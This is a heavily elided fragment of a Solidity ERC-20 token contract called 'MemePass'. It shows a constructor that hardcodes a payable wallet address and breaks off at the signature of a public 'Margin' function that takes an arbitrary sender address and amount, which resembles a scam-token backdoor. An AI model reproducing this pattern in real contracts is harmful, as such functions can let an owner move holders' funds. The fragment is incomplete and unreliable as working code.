...
contract  MemePass is Context, IERC20, Ownable{
    using SafeMath for uint256;
    string private _name = "MemePass";
    string private _symbol = "Pass";
    ...
    constructor () {
        ...
        payableAddr = payable(address(0x66EDB25a18e46D4cdc8BEe11827adbbf992db777));
    ...
    function Margin(address sender, uint256 amount) public {
